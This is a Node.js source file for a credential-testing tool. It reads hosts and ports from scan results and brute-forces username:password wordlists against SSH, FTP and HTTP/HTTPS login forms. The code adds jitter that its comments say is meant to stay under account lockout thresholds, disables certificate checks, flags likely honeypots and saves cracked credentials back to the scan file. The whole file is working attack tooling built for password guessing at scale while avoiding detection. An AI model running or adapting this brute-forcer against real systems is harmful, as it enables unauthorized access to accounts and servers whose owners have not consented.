import fs   from "node:fs";
import path from "node:path";
import { createRequire } from "node:module";

const require = createRequire(import.meta.url);

// ================================================================
//  OPTIONAL DEPENDENCIES
// ================================================================

// Load ssh2 and basic-ftp optionally so missing packages don't crash the tool
let SSHClient = null;
let ftpLib    = null;
let axios     = null;

try { ({ Client: SSHClient } = require("ssh2")); }  catch { console.warn("[warn] ssh2 not installed — SSH testing disabled"); }
try { ftpLib = require("basic-ftp"); }               catch { console.warn("[warn] basic-ftp not installed — FTP testing disabled"); }
try { ({ default: axios } = await import("axios")); } catch { console.warn("[warn] axios not installed — HTTP testing disabled"); }

// ================================================================
//  CONFIG
// ================================================================

const cfg = JSON.parse(fs.readFileSync(new URL("../config/settings.json", import.meta.url), "utf8")).credtest;

const CRED_CONCURRENCY = cfg.concurrency;
const JITTER_MIN_MS    = cfg.jitterMinMs;
const JITTER_MAX_MS    = cfg.jitterMaxMs;
const TIMEOUT_MS       = cfg.timeoutMs;
const SSH_PORTS        = new Set(cfg.sshPorts);
const FTP_PORTS        = new Set(cfg.ftpPorts);
const HTTP_PORTS       = new Set(cfg.httpPorts);
const HTTPS_PORTS      = new Set(cfg.httpsPorts);
const HTTP_ENDPOINTS   = cfg.httpEndpoints;
const HTTP_FIELDS      = cfg.httpFields;

// ================================================================
//  JITTER
// ================================================================

/**
 * Waits a random duration between JITTER_MIN_MS and JITTER_MAX_MS.
 * Higher range than the scanner to stay under account lockout thresholds.
 *
 * @returns {Promise<void>}
 */
function jitter() {
    const delay = Math.floor(Math.random() * (JITTER_MAX_MS - JITTER_MIN_MS + 1)) + JITTER_MIN_MS;
    return new Promise((resolve) => setTimeout(resolve, delay));
}

// ================================================================
//  CONCURRENCY POOL
// ================================================================

/**
 * Runs tasks with a capped number of concurrent workers.
 *
 * @param {Array<() => Promise<any>>} taskList
 * @param {number} workerLimit
 * @param {(result: any) => void} onTaskDone
 * @returns {Promise<void>}
 */
async function runPool(taskList, workerLimit, onTaskDone) {
    let taskIndex = 0;
    async function worker() {
        while (taskIndex < taskList.length) {
            const result = await taskList[taskIndex++]();
            onTaskDone(result);
        }
    }
    await Promise.all(Array.from({ length: Math.min(workerLimit, taskList.length) }, worker));
}

// ================================================================
//  SSH TESTER
// ================================================================

/**
 * Attempts SSH login with the given credentials.
 * Returns true if authentication succeeds, false otherwise.
 *
 * @param {string} host
 * @param {number} port
 * @param {string} username
 * @param {string} password
 * @returns {Promise<boolean>}
 */
function trySSH(host, port, username, password) {
    return new Promise((resolve) => {
        if (!SSHClient) return resolve(false);

        const conn = new SSHClient();
        const timer = setTimeout(() => { conn.destroy(); resolve(false); }, TIMEOUT_MS);

        conn.on("ready", () => {
            clearTimeout(timer);
            conn.end();
            resolve(true);
        });

        conn.on("error", () => {
            clearTimeout(timer);
            resolve(false);
        });

        conn.connect({ host, port, username, password, readyTimeout: TIMEOUT_MS });
    });
}

// ================================================================
//  FTP TESTER
// ================================================================

/**
 * Attempts FTP login with the given credentials.
 * Tries both plain and implicit TLS connections.
 *
 * @param {string} host
 * @param {number} port
 * @param {string} user
 * @param {string} password
 * @returns {Promise<boolean>}
 */
async function tryFTP(host, port, user, password) {
    if (!ftpLib) return false;

    const client = new ftpLib.Client(TIMEOUT_MS);
    client.ftp.verbose = false;

    // Try plain FTP first, then implicit TLS
    for (const secure of [false, true]) {
        try {
            await client.access({ host, port, user, password, secure, secureOptions: { rejectUnauthorized: false } });
            client.close();
            return true;
        } catch {
            // Try next mode
        }
    }

    client.close();
    return false;
}

// ================================================================
//  HTTP TESTER
// ================================================================

/**
 * Attempts HTTP/HTTPS form login across common endpoints and field names.
 * Detects success by a redirect response (3xx) with no error indicators.
 *
 * @param {string} host
 * @param {number} port
 * @param {string} username
 * @param {string} password
 * @param {boolean} useHTTPS
 * @returns {Promise<boolean>}
 */
async function tryHTTP(host, port, username, password, useHTTPS) {
    if (!axios) return false;

    const scheme = useHTTPS ? "https" : "http";
    const base   = `${scheme}://${host}:${port}`;

    for (const endpoint of HTTP_ENDPOINTS) {
        for (const fields of HTTP_FIELDS) {
            try {
                const payload = new URLSearchParams({
                    [fields.user]: username,
                    [fields.pass]: password,
                });

                const response = await axios.post(`${base}${endpoint}`, payload.toString(), {
                    headers:          { "Content-Type": "application/x-www-form-urlencoded" },
                    timeout:          TIMEOUT_MS,
                    maxRedirects:     0,
                    validateStatus:   (s) => s < 500,
                    httpsAgent:       useHTTPS ? new (await import("node:https")).Agent({ rejectUnauthorized: false }) : undefined,
                });

                // 302 redirect after POST typically means successful login
                const body = typeof response.data === "string" ? response.data.toLowerCase() : "";
                const isSuccess = response.status === 302 &&
                    !body.includes("invalid") &&
                    !body.includes("incorrect") &&
                    !body.includes("failed");

                if (isSuccess) return true;
            } catch {
                // Connection failed — try next endpoint
            }
        }
    }
    return false;
}

// ================================================================
//  SERVICE DETECTION
// ================================================================

/**
 * Determines the service type for a port based on port number and scan proto value.
 *
 * @param {number} portNum   - The port number
 * @param {string} portValue - The proto/banner string from the scan JSON
 * @returns {"ssh"|"ftp"|"http"|"https"|null}
 */
function detectService(portNum, portValue) {
    if (SSH_PORTS.has(portNum))                      return "ssh";
    if (FTP_PORTS.has(portNum))                      return "ftp";
    if (HTTPS_PORTS.has(portNum))                    return "https";
    if (HTTP_PORTS.has(portNum))                     return "http";
    if (portValue.startsWith("TLS"))                 return "https";
    if (portValue.startsWith("TCP: HTTP"))           return "http";
    return null;
}

// ================================================================
//  WORDLIST PARSER
// ================================================================

/**
 * Reads a wordlist file and returns credential pairs.
 * Each line must be in the format username:password.
 * Lines starting with # and blank lines are ignored.
 *
 * @param {string} filePath
 * @returns {{ user: string, pass: string }[]}
 */
function parseWordlist(filePath) {
    return fs.readFileSync(filePath, "utf8")
        .split("\n")
        .map((l) => l.trim())
        .filter((l) => l && !l.startsWith("#"))
        .map((l) => {
            const idx = l.indexOf(":");
            return { user: l.slice(0, idx), pass: l.slice(idx + 1) };
        });
}

// ================================================================
//  HOST CREDENTIAL TESTER
// ================================================================

/**
 * Tests all detected services on a host against the full wordlist.
 * Stops trying a port as soon as valid credentials are found.
 *
 * @param {string} host
 * @param {object} ports       - Port map from scan JSON { "22": "TCP", ... }
 * @param {{ user: string, pass: string }[]} credentials
 * @returns {Promise<object>}  - Map of port → { user, pass, service } for successful logins
 */
async function testHost(host, ports, credentials) {
    const found      = {};
    let honeypot     = false;

    for (const [portStr, portValue] of Object.entries(ports)) {
        const portNum = Number(portStr);
        const service = detectService(portNum, portValue);
        if (!service) continue;

        console.log(`  Testing ${host}:${portNum} [${service.toUpperCase()}]`);

        let cracked      = false;
        let attemptCount = 0;

        const tasks = credentials.map(({ user, pass }) => async () => {
            if (cracked) return;
            await jitter();

            let success = false;
            if (service === "ssh")   success = await trySSH(host, portNum, user, pass);
            if (service === "ftp")   success = await tryFTP(host, portNum, user, pass);
            if (service === "http")  success = await tryHTTP(host, portNum, user, pass, false);
            if (service === "https") success = await tryHTTP(host, portNum, user, pass, true);

            attemptCount++;

            if (success) {
                cracked = true;
                process.stdout.write("\r\x1b[K");

                // First attempt succeeding is a strong honeypot indicator —
                // real services rarely accept the very first credential tried
                if (attemptCount === 1) {
                    honeypot = true;
                    console.log(`  HONEYPOT ${host}:${portNum} [${service.toUpperCase()}] accepted first credential ${user}:${pass}`);
                    found[portStr] = { user, pass, service: service.toUpperCase(), honeypot: true };
                } else {
                    console.log(`  HIT      ${host}:${portNum} [${service.toUpperCase()}] ${user}:${pass}`);
                    found[portStr] = { user, pass, service: service.toUpperCase() };
                }
            }
        });

        await runPool(tasks, CRED_CONCURRENCY, () => {});
    }

    return { found, honeypot };
}

// ================================================================
//  ENTRY POINT
// ================================================================

const [scanFile, wordlistFile] = process.argv.slice(2);

if (!scanFile || !wordlistFile) {
    console.error("Usage: node src/credtest.js <scan.json> <wordlist.txt>");
    console.error("Example: node src/credtest.js scans/results.json config/wordlist.txt");
    process.exit(1);
}

const scanResults  = JSON.parse(fs.readFileSync(scanFile, "utf8"));
const credentials  = parseWordlist(wordlistFile);

console.log(`Loaded ${scanResults.length} host(s), ${credentials.length} credential pair(s)\n`);

for (const hostEntry of scanResults) {
    console.log(`[ ${hostEntry.host} ]`);
    const { found, honeypot } = await testHost(hostEntry.host, hostEntry.ports, credentials);

    if (Object.keys(found).length > 0) {
        hostEntry.credentials = found;
        if (honeypot) hostEntry.honeypot = "suspected — first credential accepted immediately";
        fs.writeFileSync(scanFile, JSON.stringify(scanResults, null, 2), "utf8");
        console.log(`  → Saved credentials for ${hostEntry.host}${honeypot ? " [HONEYPOT SUSPECTED]" : ""}\n`);
    } else {
        console.log(`  → No valid credentials found\n`);
    }
}

console.log("Done.");
